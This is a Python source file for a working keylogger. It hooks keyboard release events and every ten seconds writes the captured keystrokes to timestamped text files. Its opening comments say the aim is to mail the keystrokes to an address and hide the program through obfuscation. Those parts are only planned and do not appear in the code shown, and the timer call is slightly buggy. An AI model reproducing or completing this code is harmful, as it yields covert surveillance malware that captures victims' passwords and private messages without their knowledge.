#python -m pip install keyboard

# Ide: Record key strokes
# Send to some mail address
# Maybe hide itself using garbage, and encode everything as ascii?

import keyboard
import time
import threading


char_dict = {57 : ' ', 28 : '[ENTER]', 29 : '[CTRL]', 56 : '[ALT]', 15 : '[TAB]', 42 : '[SHIFT]'}


class Keylogger:
    def __init__(self, interval, doLogClear, doLogOutput):
        self.doLogClear = doLogClear
        self.doLogOutput = doLogOutput
        self.interval = interval
        self.log = "" #How we create locals for classes
        self.filename = ""
        self.time = ""

    def callback_function(self, event): #This function is called every time the on_release event happens (each time a key is lifted). Using the keyboard.hook gives for both UP and DOWN
        char = event.name
        char_code = event.scan_code

        #print(char_code)

        if char_code in char_dict:
            self.log += char_dict[char_code]
        else: self.log += char
           
    def clearLog(self):
        self.log = ""

    def getTime(self):
        self.time = time.ctime(time.time()).replace(' ', '_').replace(':', '_') #Format: Day_Month_Date_Time_Year


    def outputLog(self):
        threading.Timer(self.interval, self.outputLog, self.getTime()).start()
        
        filename = "log_at_" + self.time + ".txt"
        f = open(filename, "x")
        f.write(self.log) 
        f.close()
        if self.doLogClear: self.clearLog()


    def startLogger(self):
        keyboard.on_release(self.callback_function)
        if self.doLogOutput: self.outputLog()
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(10.0, True, True)
    keylogger.startLogger()
    keylogger.outputLog() #Testing action every INTERVAL seconds
